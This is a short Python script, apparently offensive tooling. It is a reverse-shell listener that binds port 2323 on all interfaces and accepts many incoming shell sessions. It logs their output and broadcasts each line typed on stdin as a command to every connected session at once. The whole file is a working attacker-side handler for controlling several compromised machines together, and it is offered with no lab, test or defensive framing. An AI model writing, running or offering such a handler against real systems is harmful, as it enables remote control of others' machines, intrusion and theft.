#!/usr/bin/env python3
"""Reverse-shell listener: keeps all sessions, logs output, broadcasts stdin lines to every session."""
import socket
import sys
import threading

HOST, PORT = "0.0.0.0", 2323
lock = threading.Lock()
clients = set()


def pump_out(conn, addr):
    with lock:
        clients.add(conn)
    print(f"=== session from {addr} ===", flush=True)
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            sys.stdout.write(data.decode("utf-8", "replace"))
            sys.stdout.flush()
    except OSError:
        pass
    finally:
        print("\n=== session closed ===", flush=True)
        with lock:
            clients.discard(conn)
        try:
            conn.close()
        except OSError:
            pass


def stdin_pump():
    while True:
        line = sys.stdin.readline()
        if not line:
            return
        with lock:
            targets = list(clients)
        for conn in targets:
            try:
                conn.sendall(line.encode())
            except OSError:
                pass


srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((HOST, PORT))
srv.listen(8)
print(f"revshell-host on {HOST}:{PORT}", flush=True)
threading.Thread(target=stdin_pump, daemon=True).start()
while True:
    conn, addr = srv.accept()
    threading.Thread(target=pump_out, args=(conn, addr), daemon=True).start()
